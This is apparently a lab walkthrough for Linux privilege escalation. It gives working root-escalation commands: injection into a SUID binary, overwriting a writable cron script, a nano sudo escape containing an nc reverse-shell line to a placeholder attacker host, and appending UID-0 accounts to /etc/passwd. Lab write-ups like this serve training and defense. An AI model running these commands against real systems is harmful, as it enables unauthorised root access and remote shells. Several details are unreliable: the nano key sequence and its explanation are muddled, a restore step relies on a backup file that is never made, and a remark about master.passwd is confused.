# Walkthrough — Basic Privilege Escalation

## Prerequisites

You are logged in as `appuser` on the WackyCorp warehouse management server.
Root is **not** accessible directly via SSH (`PermitRootLogin no`).

---

## Enumeration (do this first)

```bash
whoami && id         # confirm your starting point
uname -a             # kernel version (always good practice)
sudo -l                       # can you sudo anything?
groups                       # which groups are you in?
```

Notes:
- `sudo -l` shows you may run `nano /etc/hosts` as root *(Flag 3 path)*
- /etc/cron.d and /var/spool/cron often have world-readable scripts *(Flag 2 path)*
- `/opt/scripts/report.sh` has mode `777` *(red flag)*
- `/etc/passwd` has mode `777` *(another red flag)*

---

## Flag 1 — SUID Binary

The binary `/usr/local/bin/logviewer` runs with SUID root. It uses `system()` to display log files, but does **no sanitization** of the filename argument.

```bash
# 1. Find it
find / -perm -4000 -type f 2>/dev/null

# 2. Test it normally
logviewer /var/log/syslog

# 3. Abuse it — the filename is passed straight to system()
logviewer "; id; "       # you'll see uid=0(root)
logviewer "; /bin/sh; "  # interactive root shell

# 4. Capture the flag
cat /root/flag1.txt
```

**Tldr:** shell injection via `system(argv[1])` on a SUID binary.

---

## Flag 2 — Cron Job Abuse

The file `/opt/scripts/report.sh` is in the `root` crontab and is `777`:

```bash
cat /etc/cron.d/report-gen           # root runs this every minute
ls -la /opt/scripts/report.sh              # writable by everyone

# Write a payload — any one of these works:
echo '#!/bin/bash' > /opt/scripts/report.sh
echo 'chmod +s /bin/sh' >> /opt/scripts/report.sh

# OR create a SUID bash copy:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/report.sh

# Wait up to 60 seconds for cron, then:
/tmp/bash -p                     # or /bin/sh -p
cat /root/flag2.txt
```

After capture, you can restore the script manually:

```bash
/bin/sh -c 'cat /opt/scripts/report.sh.edit > /opt/scripts/report.sh'
chmod 777 /opt/scripts/report.sh
```

---

## Flag 3 — Sudo Misconfiguration

`sudo -l` shows: `appuser ALL=(ALL) NOPASSWD: /usr/bin/nano /etc/hosts`.

`nano` is a known [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) escape:

```bash
sudo nano /etc/hosts

# Inside nano, press this key sequence:
#   Ctrl+R  →  reads a file
#   Ctrl+X  →  exits (nano asks "Do you really want to exit?")
#   Type:    /etc/hosts
#           Enter
#   Type:    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker>4444 >/tmp/f
#           Enter

```

**Quicker alternative (this lab variant):**

```bash
sudo nano /etc/hosts
Ctrl+R → Ctrl+X → type: `reset; /bin/sh`
# You now have a root shell
cat /root/flag3.txt
```

The `Ctrl+R Ctrl+X` sequence tricks nano into reading a "file" whose *contents* become a command — `reset; /bin/sh` drops you into a fully-privileged shell.

---

## Flag 4 — Weak File Permissions

/etc/passwd is `777` — anyone can add or modify user accounts.

```bash
# Generate a root-equivalent user.
# uid 0 and empty password generate an entry:
python3 -c "import crypt; print(crypt.crypt('l33t'))"   # generate a hash
# OR simpler — an empty password field works too:
echo 'overlord::0:0::/root:/bin/bash' >> /etc/passwd
su overlord                             # prompt: empty password → root
cat /root/flag4.txt
```

Alternatively:

```bash
# Create a new user with UID 0
echo 'privesc::0:1::/root:/bin/sh' >> /etc/passwd
su privesc
cat /root/flag4.txt
```

**tl;dr:** /etc/master.passwd is different (you'd need to edit both files).  /etc/shadow has mode `0640` by default — this lab does not exploit a writable shadow (that would be `usermod` or `useradd` with a proper password hash instead of empty).

---

## Clean up

- Use `exit` to drop back to your `appuser` shell.
- Run `./scripts/reset.sh` to return the VM to its original state.
- Run `./scripts/validate.sh` from your host to confirm integrity.

---

## Notes on detection

In the field these same techniques surface on real reconnaissance scans:

| Technique            | Detection indicator   |
|----------------------|-----------------------|
| SUID abuse           | Unusual SUID binary   |
| Cron scripting       | Service running under writable user |
| Sudo misconfig       | Broad `sudo -l` rules |
| /etc/passwd write    | Permission anomalies  |
